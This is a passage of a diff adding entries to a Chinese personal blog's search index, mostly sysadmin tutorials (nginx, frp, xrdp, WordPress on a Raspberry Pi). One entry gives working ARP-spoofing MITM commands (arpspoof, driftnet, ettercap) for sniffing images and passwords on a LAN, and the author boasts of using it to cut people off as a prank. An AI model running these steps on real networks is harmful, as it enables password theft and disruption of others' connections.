id="1-启动nginx"><a href="#1-启动nginx" class="headerlink" title="1.启动nginx"></a>1.启动nginx</h3><p>(1).进入安装目录</p><pre><code class="bash">cd /usr/local/nginx/sbin/</code></pre><p>(2).启动</p><pre><code class="jboss-cli">./nginx</code></pre><p>(3).若报错：[emerg] open() “/var/run/nginx/nginx.pid” failed (2: No such file or directory)<br>需要查看下是不是在/var/run文件夹下不存在nginx文件夹，不存在则新建</p><p>(4).查看是否启动：<code>ps -ef  | grep nginx</code><br>如果有master和worker两个进程证明启动成功<br>注意：执行./nginx启动nginx，这里可以-c指定加载的nginx配置文件，如下：</p><pre><code class="stata">./nginx -c /usr/local/nginx/conf/nginx.conf</code></pre><p>如果不指定-c，nginx在启动时默认加载conf/nginx.conf文件，此文件的地址也可以在编译安装nginx时指定./configure的参数(–conf-path= 指向配置文件（nginx.conf）)</p><h3 id="2-停止nginx"><a href="#2-停止nginx" class="headerlink" title="2.停止nginx"></a>2.停止nginx</h3><p>(1).暴力kill(不推荐使用)</p><pre><code class="bash">kill -9 processId</code></pre><p>(2).快速停止</p><pre><code class="bash">cd /usr/local/nginx/sbin &amp;&amp; ./nginx -s stop</code></pre><p>此方式相当于先查出nginx进程id再使用kill命令强制杀掉进程</p><p>(3).完整停止(建议使用)</p><pre><code class="jboss-cli">cd /usr/local/nginx/sbin &amp;&amp; ./nginx -s quit</code></pre><p>此方式停止步骤是待nginx进程处理任务完毕进行停止。</p><h3 id="3-重启及重新加载配置"><a href="#3-重启及重新加载配置" class="headerlink" title="3.重启及重新加载配置"></a>3.重启及重新加载配置</h3><p>(1).先停止再启动（建议使用）</p><pre><code class="jboss-cli">./nginx -s quit &amp;&amp; ./nginx</code></pre><p>(2).重新加载配置文件</p><pre><code class="jboss-cli">./nginx -s reload</code></pre><h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h3><p>nginx安装成功，启动nginx,即可通过ip地址来访问nginx。（localhost或者127.0.0.1或者主机ip）</p><h2 id="Nginx设置开机启动"><a href="#Nginx设置开机启动" class="headerlink" title="Nginx设置开机启动"></a>Nginx设置开机启动</h2><h3 id="1-创建nginx-service文件"><a href="#1-创建nginx-service文件" class="headerlink" title="1.创建nginx.service文件"></a>1.创建nginx.service文件</h3><pre><code class="crystal">vim /usr/lib/systemd/system/nginx.service</code></pre><p>填入以下内容：</p><pre><code class="ini">[Unit]Description=nginx - high performance web serverAfter=nginx.service[Service]Type=forkingExecStart=/usr/local/nginx/sbin/nginx      # nginx的路径ExecReload=/usr/local/nginx/sbin/nginx -s reloadExecStop=/usr/local/nginx/sbin/nginx -s stopExecenable=/usr/local/nginx/sbin/nginx[Install]WantedBy=multi-user.target</code></pre><p>重启一下systemctl</p><pre><code class="ebnf">systemctl daemon-reload</code></pre><h3 id="2、修改脚本权限"><a href="#2、修改脚本权限" class="headerlink" title="2、修改脚本权限"></a>2、修改脚本权限</h3><pre><code class="crystal">chmod 754 /usr/lib/systemd/system/nginx.service   </code></pre><h3 id="3、设置为开启及开机自启动"><a href="#3、设置为开启及开机自启动" class="headerlink" title="3、设置为开启及开机自启动"></a>3、设置为开启及开机自启动</h3><pre><code class="stylus">systemctl start nginx.servicesystemctl status nginx.servicesystemctl enable nginx.service</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>中间人攻击</title>
+      <link href="/2019/12/31/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
+      <url>/2019/12/31/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。</p><a id="more"></a><p>中间人攻击（Man-in-the-Middle Attack, MITM）是一种由来已久的网络入侵手段，并且当今仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击。简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。<br>随着计算机通信网技术的不断发展，MITM攻击也越来越多样化。最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等。后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行。如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的。</p><h2 id="工具与条件"><a href="#工具与条件" class="headerlink" title="工具与条件"></a>工具与条件</h2><p>1.kali系统（本次实验系统）<br>2.局域网内<br>3.本次实验只是普通的中间人攻击，纯属娱乐一下</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="第一步：扫描网段内存活的主机"><a href="#第一步：扫描网段内存活的主机" class="headerlink" title="第一步：扫描网段内存活的主机"></a>第一步：扫描网段内存活的主机</h3><pre><code>fping -g -r 0 -s 192.168.1.0/24 | grep alive</code></pre><p><img src="https://img-blog.csdnimg.cn/20200101141955682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第二步：查看ip-forward的状态"><a href="#第二步：查看ip-forward的状态" class="headerlink" title="第二步：查看ip_forward的状态"></a>第二步：查看ip_forward的状态</h3><pre><code>cat /proc/sys/net/ipv4/ip_forward</code></pre><p>默认是0<br>如果不是0，则修改成0，0代表不转发流量，1代表转发流量。</p><pre><code>echo 0 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h3 id="第三步：使用arpspoof进行双向欺骗"><a href="#第三步：使用arpspoof进行双向欺骗" class="headerlink" title="第三步：使用arpspoof进行双向欺骗"></a>第三步：使用arpspoof进行双向欺骗</h3><p>安装arpspoof：</p><pre><code>sudo apt-get install dsniff ssldump</code></pre><p>进行双向欺骗：<br>开两个终端，一个终端执行下面的一条指令。<br>arpspoof -i eth0 -t 192.168.1.127 192.168.1.1<br>arpspoof -i eth0 -t 192.168.1.1 192.168.1.127</p><p>此时，192.168.1.127这台设备应该是不能正常上网了。</p><p>我就是喜欢用这招来耍人，让他们上网上网就断网了，还找不到什么原因。</p><h3 id="第四步：进行端口转发"><a href="#第四步：进行端口转发" class="headerlink" title="第四步：进行端口转发"></a>第四步：进行端口转发</h3><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h3 id="第五步：进行图片嗅探"><a href="#第五步：进行图片嗅探" class="headerlink" title="第五步：进行图片嗅探"></a>第五步：进行图片嗅探</h3><pre><code>driftnet -i eth0</code></pre><h3 id="第六步：嗅探登录密码http协议"><a href="#第六步：嗅探登录密码http协议" class="headerlink" title="第六步：嗅探登录密码http协议"></a>第六步：嗅探登录密码http协议</h3><pre><code>ettercap -Tq -i eth0</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Windows桌面远程Ubuntu系统</title>
+      <link href="/2019/12/27/Windows%E6%A1%8C%E9%9D%A2%E8%BF%9C%E7%A8%8BUbuntu%E7%B3%BB%E7%BB%9F/"/>
+      <url>/2019/12/27/Windows%E6%A1%8C%E9%9D%A2%E8%BF%9C%E7%A8%8BUbuntu%E7%B3%BB%E7%BB%9F/</url>
+      
+        <content type="html"><![CDATA[<p>来自：互联网上的小蜘蛛</p><p>我们平时远程Linux系统都是用xshell、SecureCRT等工具来远程，远程进去的都是终端界面，现在要玩的是用Windows系统自带的“远程桌面连接”软件来远程Linux系统，以Ubuntu为例。</p><a id="more"></a><h2 id="安装xrdp"><a href="#安装xrdp" class="headerlink" title="安装xrdp"></a>安装xrdp</h2><p>Windows的远程桌面使用的协议为RDP，接下来需要在Ubuntu的操作系统中安装xrdp。</p><p>打开Ubuntu的终端命令窗口。输入下面的指令进行安装。<br>安装xrdp需要安装tightvncserver组件，下面的命令将其相关的组件安装完成。</p><p><code>#sudo apt-get install tightvncserver xrdp</code></p><h2 id="连接Ubuntu"><a href="#连接Ubuntu" class="headerlink" title="连接Ubuntu"></a>连接Ubuntu</h2><p>完成安装后，进入Windows的操作系统，这里为Windows 10操作系统，打开Windows的远程桌面工具，输入Ubuntu系统的IP地址，就可以进行远程桌面的链接。<br>链接成功后，选择xorg，输入链接Ubuntu桌面的账号和密码，这里为root帐号链接</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>解决frp客户端不能同时多开问题</title>
+      <link href="/2019/12/26/frp%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8D%E8%83%BD%E5%90%8C%E6%97%B6%E5%A4%9A%E5%BC%80/"/>
+      <url>/2019/12/26/frp%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8D%E8%83%BD%E5%90%8C%E6%97%B6%E5%A4%9A%E5%BC%80/</url>
+      
+        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>前段时间我配置了frp内网穿透，最近我发现了一个问题，就是我配置了多台frp客户端，只有一台能正常连接，其他的客户端都连接不了，一开始我以为是我配置问题，反反复复的核对配置步骤，配置都是没有问题的。现在的情况是：例如说，服务端端口是7000，客户端端口是7001，6000，现在只能7000，7001端口开启 或者 7000，6000端口开启，却不能7000，7001，6000端口同时开启。这种情况带来了很大的不便，必须要找到解决方法才行。</p><a id="more"></a><h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>像这种情况还是配置问题，frp这么受欢迎的一个工具，不至于存在只能单用户机使用这么低级的功能的。所以问题应该还是出在配置上，且这个配置问题还是超出了我的认知范围。现在能解决的方法只能是查一下资料了。</p><h2 id="解决故障"><a href="#解决故障" class="headerlink" title="解决故障"></a>解决故障</h2><p>像这种使用比较广的工具，在网上的资料都是很齐全的了，只要愿意去找找就能找到解决的方法的。<br>通过搜索我终于找到了我的配置问题所在，原来是名字冲突了，修改一下名字即可。</p><p>[ssh2]     # 如果已经有一台叫[ssh]了，那么这里就修改为[ssh2],这样就不会冲突了。<br>type = tcp<br>local_ip = 192.168.2.195<br>local_port = 22<br>remote_port = 6000</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux将python默认python2修改为python3</title>
+      <link href="/2019/12/24/Linux%E5%B0%86python%E9%BB%98%E8%AE%A4python2%E4%BF%AE%E6%94%B9%E4%B8%BApython3/"/>
+      <url>/2019/12/24/Linux%E5%B0%86python%E9%BB%98%E8%AE%A4python2%E4%BF%AE%E6%94%B9%E4%B8%BApython3/</url>
+      
+        <content type="html"><![CDATA[<h1 id="kali-Linux将python修改为默认python3"><a href="#kali-Linux将python修改为默认python3" class="headerlink" title="kali Linux将python修改为默认python3"></a>kali Linux将python修改为默认python3</h1><p>现在python2接近2020年的停止维护时间了，可以说python2已经被淘汰掉了，而不少Linux系统上还默认是python2，而我们使用时每次都要刻意输入python3，感觉有点繁琐，作为一个懒癌患者，自然是无法容忍的。</p><a id="more"></a><h2 id="查看默认python是什么版本："><a href="#查看默认python是什么版本：" class="headerlink" title="查看默认python是什么版本："></a>查看默认python是什么版本：</h2><p>输入：python -V </p><h2 id="查看python路劲："><a href="#查看python路劲：" class="headerlink" title="查看python路劲："></a>查看python路劲：</h2><p>which python<br>显示是在    /usr/bin/python</p><h2 id="查看所有的python文件"><a href="#查看所有的python文件" class="headerlink" title="查看所有的python文件"></a>查看所有的python文件</h2><p>ls -al /usr/bin/python*</p><h2 id="删除当前python文件"><a href="#删除当前python文件" class="headerlink" title="删除当前python文件"></a>删除当前python文件</h2><p>sudo rm -rf /usr/bin/python</p><h2 id="替换为python3"><a href="#替换为python3" class="headerlink" title="替换为python3"></a>替换为python3</h2><p>ln -s /usr/bin/python3 /usr/bin/python</p><h2 id="再次查看默认python是什么版本："><a href="#再次查看默认python是什么版本：" class="headerlink" title="再次查看默认python是什么版本："></a>再次查看默认python是什么版本：</h2><p>输入：python -V </p><p>到此已完成了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>树莓派使用wordpress搭建博客网站</title>
+      <link href="/2019/12/18/%E6%A0%91%E8%8E%93%E6%B4%BEwordpress%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/"/>
+      <url>/2019/12/18/%E6%A0%91%E8%8E%93%E6%B4%BEwordpress%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/</url>
+      
+        <content type="html"><![CDATA[<p>手上的树莓派压箱底很久了，拿出来清清灰尘，通电还是能正常跑起来，这个树莓派是几年前就买了，好像是2代来的，内存只有512MB，现在树莓派都出到4B了，好想再剁手买一个新的树莓派4B来压下箱底，但仔细想想，如果树莓派没有派上用场的地方，再买一个新的也只是拿来观赏玩玩就扔一边放灰了，所以现在还是想想怎么把手上的老树莓派利用起来先，最近看到一篇教程就是用树莓派搭建博客网站，就想着拿来试试。正是如此，才让树莓派有了重见天日的机会。</p><a id="more"></a><h4 id="事情准备"><a href="#事情准备" class="headerlink" title="事情准备"></a>事情准备</h4><p><strong>安装树莓派系统</strong><br>下载镜像的地方<br>官网：<a href="https://www.raspberrypi.org/downloads/" target="_blank" rel="noopener">https://www.raspberrypi.org/downloads/</a><br>树莓派实验室：<a href="http://shumeipai.nxez.com/download#os" target="_blank" rel="noopener">http://shumeipai.nxez.com/download#os</a><br>工具：Win32DiskImager<br>具体安装步骤就不详细写了，网上一搜一大把。<br>接下来准备显示器，网线，键盘，连接上去修改密码，配置网络，更新系统<br>有一点要重点讲的，那就是配置ssh，树莓派默认是没有安装ssh服务的</p><h4 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h4><p>安装ssh<br>sudo apt install openssh-server<br>查看ssh有没有运行<br>systemctl status ssh.service     查看状态<br>systemctl start ssh.service        启动ssh<br>sytemctl enable ssh.service      设置开机启动<br>sudo /etc/init.d/ssh start            设置开机启动的第二种方法</p><h4 id="配置静态ip地址"><a href="#配置静态ip地址" class="headerlink" title="配置静态ip地址"></a>配置静态ip地址</h4><p>因为要搭建博客网站，就难免要内网穿透，就要设置静态ip了。</p><pre><code>sudo vim /etc/dhcpcd.conf</code></pre><p>填入：</p><pre><code>interface eth0static ip_address=192.168.1.179/24static routers=192.168.1.1static domain_name_servers=114.114.114.114 8.8.8.8</code></pre><p>reboot 重启系统</p><h3 id="开始搭建网站了"><a href="#开始搭建网站了" class="headerlink" title="开始搭建网站了"></a>开始搭建网站了</h3><h4 id="1-更换镜像源"><a href="#1-更换镜像源" class="headerlink" title="1.更换镜像源"></a>1.更换镜像源</h4><p><code>sudo vim /etc/apt/sources.list</code> 或者   <code>sudo nano /etc/apt/sources.list</code></p><p>把里面的源都注释掉，添加下面的进去。</p><pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi</code></pre><p>保存退出</p><pre><code>sudo apt-get update</code></pre><h4 id="2-安装Apache"><a href="#2-安装Apache" class="headerlink" title="2.安装Apache"></a>2.安装Apache</h4><p>Apache是世界使用排名第一的Web服务器软件（开放源码的网页服务器）。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一</p><pre><code>sudo apt-get install apache2</code></pre><h4 id="3-安装MySQL"><a href="#3-安装MySQL" class="headerlink" title="3.安装MySQL"></a>3.安装MySQL</h4><p>MySQL是最好的关系数据库管理系统应用软件，其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。</p><pre><code>sudo apt-get install mysql-server</code></pre><p><strong>到了这里就要注意了，我用这个指令安装的时候是报错的。如下图：</strong><br><img src="https://img-blog.csdnimg.cn/20191220073926523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>E：软件包“ mysql-server”没有安装候选</strong></p><p>解决方法参考这个网友的做法：<a href="https://blog.csdn.net/wangmy1988/article/details/100550810" target="_blank" rel="noopener">https://blog.csdn.net/wangmy1988/article/details/100550810</a></p><p>安装mariadb-server</p><pre><code>sudo apt-get install mariadb-server</code></pre><h4 id="4-安装phpMyAdmin"><a href="#4-安装phpMyAdmin" class="headerlink" title="4.安装phpMyAdmin"></a>4.安装phpMyAdmin</h4><p>phpMyAdmin 是一个以PHP为基础的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。</p><pre><code>sudo apt-get install phpmyadmin</code></pre><p><img src="https://img-blog.csdnimg.cn/2019122007503025.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>默认选择apache2，回车</p><p><img src="https://img-blog.csdnimg.cn/20191220075905499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>回车<br><img src="https://img-blog.csdnimg.cn/20191220080031735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入密码，tab健，选择ok<br><img src="https://img-blog.csdnimg.cn/20191220080149719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再次输入确认密码，选择ok，就安装完成了。</p><h4 id="5-配置MySQL"><a href="#5-配置MySQL" class="headerlink" title="5.配置MySQL"></a>5.配置MySQL</h4><pre><code>vim /etc/apache2/apache2.conf&lt;Directory /var/www/&gt;        Options Indexes FollowSymLinks        AllowOverride None           # 将 None 改成 All        Require all granted&lt;/Directory&gt;</code></pre><p>sudo mysql -u root -p<br><strong>提示输入密码，这里直接回车就行，或者输入什么密码都可以进去。</strong></p><p>重置mysql的加密方式：</p><pre><code>MariaDB [(none)]&gt; update mysql.user set plugin = &#39;mysql_native_password&#39;;</code></pre><p>返回以下则代表成功了。</p><pre><code>Query OK, 2 rows affected (0.009 sec)Rows matched: 2  Changed: 2  Warnings: 0</code></pre><p>更改数据库用户名和密码：</p><pre><code>MariaDB [(none)]&gt; update mysql.user set password=PASSWORD(&quot;~~mysqlpassword~~ &quot;) where User=&#39;root&#39;;Query OK, 1 row affected (0.012 sec)Rows matched: 1  Changed: 1  Warnings: 0</code></pre><p>刷新权限信息：</p><pre><code>MariaDB [(none)]&gt; flush privileges;Query OK, 0 rows affected (0.003 sec)</code></pre><p>CTRL C退出</p><h4 id="6-配置phpmyadmin"><a href="#6-配置phpmyadmin" class="headerlink" title="6.配置phpmyadmin"></a>6.配置phpmyadmin</h4><p>把phpayadmin链接到/var/www/html目录下</p><pre><code>sudo ln -s /usr/share/phpmyadmin /var/www/html</code></pre><h4 id="7-创建数据库"><a href="#7-创建数据库" class="headerlink" title="7.创建数据库"></a>7.创建数据库</h4><p>在浏览器上输入<a href="http://192.168.1.179/phpmyadmin/" target="_blank" rel="noopener">http://192.168.1.179/phpmyadmin/</a><br>（账号密码就是刚才mysql设置的账号密码）<br><img src="https://img-blog.csdnimg.cn/20191220211112713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>填写数据库信息：<br>数据库名称为wordpress，数据库的数据编码为utf8_unicode_ci<br><img src="https://img-blog.csdnimg.cn/20191220211745805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="8-安装wordpress"><a href="#8-安装wordpress" class="headerlink" title="8.安装wordpress"></a>8.安装wordpress</h4><p>修改权限<br><code>sudo chmod 777 /var/www/html</code>    #我用的是root用户，所以不用这一步。<br><code>rm /var/www/html/index.html</code>         #删除默认自带的index.html文件</p><p>下载wordpress<br>到官网下载：<a href="https://wordpress.org/" target="_blank" rel="noopener">https://wordpress.org/</a>    最近官网总是访问不了，报错429。<br>这是一网上找的一个备用地址：<a href="http://cn.wp101.net/download/" target="_blank" rel="noopener">http://cn.wp101.net/download/</a>    我下载过没有发现问题。</p><p>下载好之后，解压：<code>tar zxf wordpress-5.3.2-zh_CN.tar.gz</code><br>将解压的wordpress文件移动到/var/www/html下</p><h4 id="9-配置wordpress"><a href="#9-配置wordpress" class="headerlink" title="9.配置wordpress"></a>9.配置wordpress</h4><p>电脑浏览器输入树莓派ip，会出现一些目录，点击选wordpress，自动跳出安装页面。<br><img src="https://img-blog.csdnimg.cn/20191220213744441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019122021384086.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击现在就开始。<br>数据库名就是刚才建立的wordpress<br>用户名和密码就是上面mysql设置的账号密码<br><img src="https://img-blog.csdnimg.cn/20191220214209959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>输入用户名密码后，点击提交<br><img src="https://img-blog.csdnimg.cn/20191220215203460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>到了这里先别急着点击现在安装,将上面的这些内容复制。</strong></p><p>回到树莓派终端上面<br>在/var/www/html/wordpress文件下创建一个wp-config.php<br>nano wp-config.php<br>将上面复制的内容复制进来，然后保存。</p><p><strong>保存后在回到刚刚那个网页上面点击现在安装。</strong></p><h4 id="10-填写基本信息"><a href="#10-填写基本信息" class="headerlink" title="10.填写基本信息"></a>10.填写基本信息</h4><p><img src="https://img-blog.csdnimg.cn/20191220220212535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>填写完之后，选择安装wordpress<br><img src="https://img-blog.csdnimg.cn/20191220220327189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在浏览器输入ip 地址/wordpress可以进入到博客<br>例如：<a href="http://192.168.1.179/wordpress/" target="_blank" rel="noopener">http://192.168.1.179/wordpress/</a><br><img src="https://img-blog.csdnimg.cn/20191220220758889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入192.168.1.179/wordpress/wp-admin/可以进入博客的后台进行管理<br><img src="https://img-blog.csdnimg.cn/20191220220936249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>好了，到这里我们就搭建完成了。接下来就是就是处理内网穿透的问题了，我前面写了centos7和ubuntu的内网穿透，由于树莓派的系统raspberrypi 跟这两个系统不一样，方法不适用，我先做一番测试再写个教程吧，上面这些步骤是我一步一步试过的，是可行的，如果有人按照上面的步骤出错的话，请仔细排除一下有没有哪步搞错了。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>git上传博客不成功的故障排查</title>
+      <link href="/2019/12/16/git%E4%B8%8A%E4%BC%A0%E5%8D%9A%E5%AE%A2%E4%B8%8D%E6%88%90%E5%8A%9F%E7%9A%84%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/"/>
+      <url>/2019/12/16/git%E4%B8%8A%E4%BC%A0%E5%8D%9A%E5%AE%A2%E4%B8%8D%E6%88%90%E5%8A%9F%E7%9A%84%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="发现故障"><a href="#发现故障" class="headerlink" title="发现故障"></a>发现故障</h1><p>今天写了一篇博客，然后用git上传到github上，git终端上显示没有什么异常，过了一会，我到浏览器打开我的博客网站，发现没有看到刚刚上传的博客，一开始还以为是网络延迟呢，又过了一会我打开还是没有看到，我换了三个浏览器都没有看到，我清楚我要开始排除故障了。</p><a id="more"></a><h1 id="分析故障"><a href="#分析故障" class="headerlink" title="分析故障"></a>分析故障</h1><p><strong>分析故障的第一要素绝对是要看故障现象</strong><br>我重新查看了一遍自己的步骤<br>blog目录路径没错<br>hexo g   显示也没什么问题（一开始没有看仔细）<br>hexo d   显示已经上传成功的界面</p><p><strong>分析故障的第二要素就是看日志</strong><br>git log<br>提示：<br>fatal: not a git repository (or any of the parent directories): .git</p><p>我才发现我还没又创建 .git 文件<br>创建下 .git 文件，下次能用到<br>git init</p><p>看不了日志就从别的地方开始查</p><h1 id="查看故障"><a href="#查看故障" class="headerlink" title="查看故障"></a>查看故障</h1><p><strong>从终端git 到 GitHub 一路找过去</strong><br>在git上排除原因：<br>git config user.name   查看用户名有没有问题，结果正常<br>git config user.email    查看邮箱是否正确，结果正常<br>ssh -T <a href="mailto:git@github.com">git@github.com</a>   连接gGitHub也显示正常</p><p>在GitHub上找原因<br>我登录我github的仓库看看，发现没有今天的数据，只有15号的数据，也就是说git根本没有上传成功</p><h1 id="解决故障"><a href="#解决故障" class="headerlink" title="解决故障"></a>解决故障</h1><p><strong>重启git终端</strong><br>重启git终端之后，再次重新上传博客，这次发现报错了<br><img src="https://img-blog.csdnimg.cn/20191217214524275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示第五行出错了<br>我打开博客文件发现，date:2019-12-17 之间少了一个空格，添加空格之后发现执行 hexo g 正常了</p><p>我继续执行hexo d 之后又报错了<br><img src="https://img-blog.csdnimg.cn/20191217214827112.png" alt="在这里插入图片描述"><br>显示生成失败，这又是第一次遇到的故障，之前从来没有遇到过的，我的直觉告诉我，可能是我所处在的商业网络不稳定或者做了某方面的限制。<br>我尝试多次执行hexo d 指令还是报错。<br>无奈之下我开启了我的VPN，然后再次执行，就成功了。<br>刷新博客，已经正常显示了。<br>到最后我还是没有搞清楚是什么原因导致了上传不成功，网络做了限制了吗? 这个问题留给我以后解决。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 随笔 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 随笔 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>掷骰子决定做什么事情</title>
